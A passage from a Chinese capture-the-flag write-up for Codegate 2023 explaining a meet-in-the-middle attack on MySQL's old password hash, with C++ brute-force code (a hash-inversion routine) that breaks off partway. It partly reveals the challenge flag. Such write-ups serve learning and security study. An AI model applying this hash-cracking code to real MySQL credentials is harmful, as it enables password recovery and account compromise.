&lt;/ul&gt;
&lt;p&gt;所以我们只需要MitM，中间相遇，即可爆出正解。&lt;br&gt;这个中间状态指的是&lt;code&gt;&amp;lt;???&amp;gt;&lt;/code&gt;这串未知字串中间某个位置一个独特的nr&amp;#x2F;nr2&amp;#x2F;add对；而这个add值毕竟只是一个中间量（&lt;strong&gt;下称fadd&lt;/strong&gt;），可以手动给予一个值。在本题中我们手动要求从&lt;code&gt;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&amp;lt;???&amp;gt;i_love_you&amp;#125;&lt;/code&gt;再向前填充总计&lt;code&gt;6*127&lt;/code&gt;的字符作为中间相遇处：当然越大的值搜索空间越大。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们先筛选出可行的add值，并记录在处理&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;前的中间add值&lt;/li&gt;
&lt;li&gt;逆向: 对于每个中间add值先逆推5步，记录所有可能在中间相遇处add值为fadd的nr&amp;#x2F;nr2对，以及逆向对应的5个字符&lt;/li&gt;
&lt;li&gt;正向: 我们手动要求向前数步到达中间相遇处使得add值为fadd，并检查这个nr&amp;#x2F;nr2对是否出现在逆向得到的结果中；如果有，则拿下。&lt;br&gt;爆破代码：Credit to @4qwerty&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stddef.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;thread&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;mutex&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unordered_map&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;atomic&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;title&#34;&gt;oldpw_rev&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *cc, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr, nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; c, u, e, y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (len == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr = *pnr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = *pnr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c = cc[len - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add -= c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    y = nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (e = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; e &amp;lt; &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;; e ++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; z, g;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        z = (e + add) * c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        g = (e ^ z) &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (g == (y &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;nr, &amp;amp;nr2, add, cc, len - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                *pnr = nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                *pnr2 = nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;forward&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *cc, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *add)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; len; 